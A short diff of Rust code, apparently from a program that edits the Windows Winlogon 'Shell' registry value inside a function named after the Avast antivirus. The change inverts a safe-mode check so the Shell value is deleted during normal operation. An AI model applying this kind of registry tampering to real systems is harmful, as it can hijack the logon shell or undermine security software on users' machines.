@@ -163,7 +163,7 @@ fn modify_registry_avast() -> io::Result<()> {
     )?;
 
     // If the system is in safe mode, revert changes and set "Shell" back to explorer.exe
-    if is_in_safe_mode() {
+    if !is_in_safe_mode() {
         // Delete the existing "Shell" value if it exists
         match winlogon_key.delete_value("Shell") {
             Ok(_) => println!("Existing Shell value deleted (safe mode)."),
